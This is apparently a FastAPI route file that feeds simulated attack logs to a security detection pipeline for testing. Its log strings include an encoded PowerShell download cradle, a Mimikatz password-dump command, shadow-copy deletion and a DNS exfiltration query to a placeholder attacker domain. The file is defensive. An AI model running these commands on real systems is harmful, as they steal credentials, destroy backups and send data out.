from fastapi import APIRouter, HTTPException, Depends
from pydantic import BaseModel
from typing import List, Dict, Any
from app.models.log_event import RawLogInput
from app.pipeline.orchestrator import SecurityPipeline

router = APIRouter(prefix="/api/simulation", tags=["Attack Simulator"])

def get_pipeline() -> SecurityPipeline:
    from app.main import pipeline
    return pipeline

class SimRequest(BaseModel):
    scenario: str  # ssh_bruteforce, powershell_cradle, mimikatz_dump, ransomware_attack, c2_beaconing, port_scan, benign_traffic

@router.post("/run")
def run_simulation(payload: SimRequest, pipeline: SecurityPipeline = Depends(get_pipeline)):
    """Executes a realistic cybersecurity attack or traffic simulation scenario."""
    sc = payload.scenario.lower()

    if sc == "ssh_bruteforce":
        ip = "185.220.101.5"
        logs = [
            RawLogInput(
                source_type="linux_auth",
                raw_message=f"Failed password for invalid user admin from {ip} port {45010+i} ssh2",
                hostname="linux-server"
            ) for i in range(5)
        ]
        res = pipeline.process_batch_logs(logs)
        return {
            "scenario": "SSH Brute Force Attack",
            "description": f"Simulated 5 brute-force SSH authentication attempts from botnet IP {ip}.",
            "result": res
        }

    elif sc == "powershell_cradle":
        log = RawLogInput(
            source_type="windows_security",
            raw_message="EventID: 4688 Computer: win-workstation CommandLine: powershell.exe -NoP -NonI -W Hidden -Exec Bypass -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAA= ParentProcessName: cmd.exe TargetUserName: finance_user",
            hostname="win-workstation"
        )
        res = pipeline.process_raw_log(log)
        return {
            "scenario": "Obfuscated PowerShell Download Cradle",
            "description": "Simulated fileless in-memory PowerShell staging execution.",
            "result": res
        }

    elif sc == "mimikatz_dump":
        log = RawLogInput(
            source_type="windows_security",
            raw_message="EventID: 4688 Computer: dc-prod-01 NewProcessName: C:\\Temp\\mimikatz.exe CommandLine: mimikatz.exe privilege::debug sekurlsa::logonpasswords exit TargetUserName: administrator",
            hostname="dc-prod-01"
        )
        res = pipeline.process_raw_log(log)
        return {
            "scenario": "LSASS Credential Dumping (Mimikatz)",
            "description": "Simulated memory extraction of plaintext passwords on Primary Domain Controller.",
            "result": res
        }

    elif sc == "ransomware_attack":
        log = RawLogInput(
            source_type="windows_security",
            raw_message="EventID: 4688 Computer: win-workstation CommandLine: vssadmin delete shadows /all /quiet TargetUserName: finance_user",
            hostname="win-workstation"
        )
        res = pipeline.process_raw_log(log)
        return {
            "scenario": "Ransomware Shadow Copy Deletion",
            "description": "Simulated pre-encryption defense evasion disabling Volume Snapshot recovery.",
            "result": res
        }

    elif sc == "c2_beaconing":
        log = RawLogInput(
            source_type="web_access",
            raw_message='10.0.4.15 - - [19/Oct/2026:07:00:15 +0000] "POST /api/v1/heartbeat HTTP/1.1" 200 128 "-" "Mozilla/5.0"',
            hostname="win-workstation",
            metadata={"dest_ip": "103.224.182.245", "dest_port": 4444}
        )
        res = pipeline.process_raw_log(log)
        return {
            "scenario": "Cobalt Strike C2 Beaconing",
            "description": "Simulated periodic outbound HTTPS beacon heartbeat to external C2 node 103.224.182.245.",
            "result": res
        }

    elif sc == "port_scan":
        ip = "45.33.32.156"
        ports = [21, 22, 80, 443, 3389, 8080]
        logs = [
            RawLogInput(
                source_type="network_zeek",
                raw_message=f"TCP connection attempt from {ip} to internal server port {p}",
                metadata={"src_ip": ip, "dest_port": p}
            ) for p in ports
        ]
        res = pipeline.process_batch_logs(logs)
        return {
            "scenario": "TCP Port Scanning Reconnaissance",
            "description": f"Simulated rapid TCP syn sweep across 6 ports from Shodan/Masscan scanner IP {ip}.",
            "result": res
        }

    elif sc == "dns_tunneling":
        log = RawLogInput(
            source_type="network_zeek",
            raw_message="DNS query A 7861636b6564.exfil-data.evil-c2-domain.com from 10.0.4.15",
            metadata={"domain": "7861636b6564.exfil-data.evil-c2-domain.com", "src_ip": "10.0.4.15"}
        )
        res = pipeline.process_raw_log(log)
        return {
            "scenario": "DNS Tunneling Data Exfiltration",
            "description": "Simulated encoded data exfiltration via TXT/A query subdomains to evil-c2-domain.com.",
            "result": res
        }

    elif sc == "benign_traffic":
        logs = [
            RawLogInput(
                source_type="linux_auth",
                raw_message="Accepted publickey for ubuntu from 10.0.0.50 port 55120 ssh2",
                hostname="linux-server"
            ),
            RawLogInput(
                source_type="web_access",
                raw_message='10.0.0.12 - analyst [19/Oct/2026:07:01:00 +0000] "GET /index.html HTTP/1.1" 200 4520 "-" "Mozilla/5.0"',
                hostname="linux-server"
            ),
            RawLogInput(
                source_type="windows_security",
                raw_message="EventID: 4624 Computer: win-workstation TargetUserName: finance_user LogonType: 2",
                hostname="win-workstation"
            ),
            RawLogInput(
                source_type="windows_security",
                raw_message="EventID: 4688 Computer: win-workstation CommandLine: C:\\Windows\\explorer.exe TargetUserName: finance_user",
                hostname="win-workstation"
            ),
            RawLogInput(
                source_type="web_access",
                raw_message='10.0.0.15 - hr_lead [19/Oct/2026:07:01:25 +0000] "GET /api/v1/profile HTTP/1.1" 200 1024 "-" "Mozilla/5.0"',
                hostname="linux-server"
            )
        ]
        res = pipeline.process_batch_logs(logs)
        return {
            "scenario": "Benign Corporate Background Traffic",
            "description": "Ingested 5 legitimate corporate authentication, web, and process logs.",
            "result": res
        }

    else:
        raise HTTPException(status_code=400, detail=f"Unknown scenario '{payload.scenario}'. Available: ssh_bruteforce, powershell_cradle, mimikatz_dump, ransomware_attack, c2_beaconing, port_scan, dns_tunneling, benign_traffic")
